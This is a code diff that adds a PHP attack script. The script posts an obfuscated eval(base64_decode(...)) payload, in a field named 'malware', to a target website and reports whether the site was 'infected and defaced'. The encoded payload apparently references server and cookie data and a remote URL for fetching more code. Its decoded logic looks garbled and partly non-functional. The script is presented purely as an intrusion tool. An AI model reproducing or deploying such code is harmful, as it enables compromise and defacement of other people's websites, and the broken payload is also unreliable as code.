@@ -1,0 +1,26 @@
+<?php
+
+error_reporting(0);
+
+$targetURL = "http://www.targetwebsite.com/";
+
+$htmlFilePath = "cazzy.html";
+
+$htmlFileContent = file_get_contents($htmlFilePath);
+
+$payload = "<?php eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21hc3RlciJdKSl7JHRhcmdldF9zdGFydCgnYmFzZTY0X2RlY29kZSgnR0VUWycsJyAnLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iJywnJyAnLiRfQ09PS0lFWydSRVFVRVNUX1VSTCddLiInLCAnLiRfRklMRVNbJ0hUVFBfSE9TVCddLiInLCAnLiRfVVJMb2FkZXJzJ10uIicpOyR0YXJnZXQgPSAiIjskJHRhcmdldF9zdGFydCgnYmFzZTY0X2RlY29kZSgnR0VUWydIVFRQX0hPU1QnXS4iJywnJyAnLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iJywnJyAnLiRfQ09PS0lFWydSRVFVRVNUX1VSTCddLiInLCAnLiRfRklMRVNbJ0hUVFBfSE9TVCddLiInLCAnLiRfVVJMb2FkZXJzJ10uIicpOyRrZXl3b3JkX3R5cGUgPSAnaHRtbHNwZWMnOyRrZXl3b3JkID0gJ2h0dHBzOi8vZ2l0aHViLmNvbS9rZXl3b3JkL2JpbmFyeS5waHAnOyRrZXl3b3JkX2V4ZWMgPSAkY29tcGxleF9nZXRfY29udGVudHMoJGtleXdvcmRfdHlwZSk7ZXhpdCgpOw==')); ?>";
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $targetURL);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, array('malware' => $payload));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$response = curl_exec($ch);
+curl_close($ch);
+
+if ($response === "SUCCESS") {
+    echo "Website infected and defaced successfully!";
+} else {
+    echo "Failed to infect the website. Try again later.";
+}
+?>
